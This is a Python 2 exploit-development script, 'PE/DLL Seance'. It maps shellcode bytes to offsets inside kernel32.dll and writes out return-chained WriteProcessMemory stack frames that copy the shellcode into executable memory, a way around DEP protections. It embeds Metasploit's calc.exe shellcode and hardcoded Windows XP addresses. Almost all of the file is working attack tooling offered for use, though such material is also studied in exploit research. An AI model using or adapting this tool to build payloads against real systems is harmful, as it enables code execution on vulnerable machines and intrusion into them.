#!/usr/bin/env python
#
# PE/DLL Seance
#
# Raises shellcode spirits from the kernel32.dll graveyard
# aka
# Maps shellcode byte sequences to offsets in a PE/DLL
#
# Written by Spencer Pratt
# spencer.w.pratt@gmail.com
#
# 0d51c816ade5116f294a2a0087631281de5da0b0ea49c2d9bf9298d0d0ea7e92
# 123a9366f55bc1f8ee685915e91365aa572070946f417298742279e023c88700
# 

import struct
import sys
import binascii
import pefile

# global variable for address of WriteProcessMemory()
# modify value in __main__
global WPMGLOBAL

# filepath is PE/DLL file
# shellcode is shellcode
def exorcise(filepath, shellcode):

	# pe file open and load
	pe = pefile.PE(filepath, fast_load=True)
	pe.full_load()	

	# get the address
	address = pe.OPTIONAL_HEADER.ImageBase

	# get to the code segment (past the externs)
	codesegment = 0x7c801624 - address

	# update address to reflect new reference point
	address = 0x7c801624

	# get the actual code from the PE
	data = pe.get_memory_mapped_image()[codesegment:]

	# length of shellcode
	slen = len(shellcode)

	# list to store unique chunks in
	sublist = list()

	# for each offset in shellcode
	for s1 in range(slen):

		# store from that offset
		subshell = shellcode[s1:]

		# get the length of code starting from that offset
		sublen = len(subshell)

		# for each size in this subshell
		for s2 in range(sublen):

			# get chunk of that size
			mini = subshell[:s2+1]

			# ensure it is at least 2 bytes long
			if (len(mini) < 2): 
		 		continue
			
			# if it is unique (not already in list)
			if mini not in sublist:
				# add it
				sublist.append(mini)

	# sublist now has all unique pieces of 2 or more bytes
	print "--!|  scanning for", len(sublist), "unique sequences.."

	# final list of chunks
	# this is the list of chunks actually found in .dll/pe
	final = list()
	
	# for each chunk in the list..
	for micro in sublist:

		# if the chunk is in the PE data
		if micro in data:
			# add it to final list
			final.append(micro)	
	
	# sort by length
	final.sort(key=lambda x:(len(x), x))	
	
	# reverse it so the order is largest first
	final.reverse()

	# table represents shellcode coverage with found chunks
	xtable = list()
	
	# set a marker for each byte of shellcode in the xtable	
	# reflecting that bytes as not yet mapped to an offset	
	for x in shellcode:
		xtable.append("0")
	
	# legend maps found chunks to their locations
	legend = {}
		
	# for each series of bytes found in the PE/DLL that coincides
	for bling in final:

		# find all locations in the shellcode it satisfies
		for hit in findall(shellcode, bling):

			# check the coverage table, if is not already covered 
			if xtable[hit] == "0" and xtable[hit + len(bling) - 1] == "0":
				# this means the piece offers coverage
                # for something not already covered		

				# find it in the PE data
				whereindata = data.find(bling)

				# add a hit identifying offset in shellcode, 
				# where in the source data, and how long it is
				legend[hit] = [whereindata, len(bling)]	

				# update the coverage table to reflect coverage
				for x in range(len(bling)):
					xtable[x+hit] = "1"
			
	# for remaining bytes to be remapped
	# (bytes not covered by chunks)
	for index in range(len(xtable)):

		# if byte is not covered
		if xtable[index] == "0":

			# find where it is in the PE data
			whereindata = data.find(shellcode[index])

			# store single byte location		
			legend[index] = [whereindata, 1]

	global WPMGLOBAL

	print "--!|  setting initial return address"
	frame = WPMGLOBAL

	patcharea = 0x7c861967;

	# how many calls to copy in shellcode
	print "--!|  shellcode legend size:", len(legend)

	# print table header
	print "    ________________________________________________________ "
	print "   |----    Bytes    ----------   PE/DLL   ---    WPM()  ---|"
	print "   |--------------------------------------------------------|"

	counter = 0
	totalcount = len(legend)
	
	for x in legend:
		counter+=1
		start = x

		details = legend[x]
		source = details[0]
		length = details[1]

		end = start + length

		# PE address
		dlloffset = source + address

		# determine the offset into WriteProcessMemory()
		wpmoffset = patcharea + start

		# while its available, add stack frame
		if counter == totalcount:
			frame += stack_wpm(dlloffset, wpmoffset, length, packint(patcharea))
		else:
			frame += stack_wpm(dlloffset, wpmoffset, length, 0)
		
		# pack, invert + hexlify 
		dlloffset = packint(dlloffset)
		endian = invert4(dlloffset)
		location = binascii.hexlify(endian)		

		wpmoffset = packint(wpmoffset)
		endian = invert4(wpmoffset)
	 	patchaddr = binascii.hexlify(endian)

		# padding variables for uniform output
		startpad = 0
		endpad = 0

		# determine output padding lengths
		if (len(str(start))) < 3:
			startpad = 3 - len(str(start))

		if (len(str(end))) < 3:
			endpad = 3 - len(str(end))	
	
		# print output
		outstr = "   |  shellcode[" + (startpad * "0") + str(start) + "-"
		outstr += (endpad * "0") + str(end) + "]        0x" + location
		outstr += " -->  0x" + patchaddr + "  |"   
		print outstr

	footer =  "   `-------------------------------------------------------"
	footer += "\xc2\xb4\n\n" 
	sys.stdout.write(footer)

	print "--!|  final ret addr: code patch area 0x" + binascii.hexlify(invert4(packint(patcharea)))

	return frame

# just a convenience function
def packint(data):
	return struct.pack("l", data)

# invert endian orientation
def invert4(data):
	return data[3] + data[2] + data[1] + data[0]

# build stack frames
def stack_wpm(source, dest, length, eip):
	# location of WriteProcessMemory()
	global WPMGLOBAL

	if eip != 0:
		wpm = eip
	else:
		wpm = WPMGLOBAL

	# hProcess HANDLE of -1
	handle = "\xff\xff\xff\xff"

	# pack ints
	source = packint(source)
	dest = packint(dest)
	length = packint(length)
	
	stack = wpm + handle + dest + source + length + "\x00\x00\x00\x00"
	return stack

# findall function stolen from howto
def findall(hay, needle, start=0):
	i = start - 1
	try:
		i = hay.index(needle, i+1)
		yield i	
	except ValueError:
		pass

# main function
if __name__ == "__main__":
	global WPMGLOBAL
	WPMGLOBAL = "\x13\x22\x80\x7c"
	argc = len(sys.argv)
	
	print "\n--!|  PE/DLL Seance"
	print "--!|  Builds stack frames for return-chaining WriteProcessMemory()"

	if (argc < 3):
		print "--!|  usage:", sys.argv[0], "/path/to/kernel32.dll output.txt\n"	
		sys.exit(1)

	kernel32 = sys.argv[1]
	outpath = sys.argv[2]

	# calc.exe shellcode: from metasploit 
	shellcode = "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78"
	shellcode +="\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34"
	shellcode +="\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca"
	shellcode +="\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04\x75\xe5\x8b\x5f"
	shellcode +="\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x8b"
	shellcode +="\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x5f\x31\xf6\x60"
	shellcode +="\x56\x64\x8b\x46\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b"
	shellcode +="\x68\x08\x89\xf8\x83\xc0\x6a\x50\x68\x7e\xd8\xe2\x73"
	shellcode +="\x68\x98\xfe\x8a\x0e\x57\xff\xe7\x63\x61\x6c\x63\x2e"
	shellcode +="\x65\x78\x65\x00";

	# perform seance	
	# find the shellcode in the ether
	spirits = exorcise(kernel32, shellcode)

	print "--!|  writing stackframes to", outpath + ".."

	output = open(outpath, 'w')
	
	output.write(spirits)
	print "--!|  complete!"
	
	output.close()
	print "--!|  exiting\n"

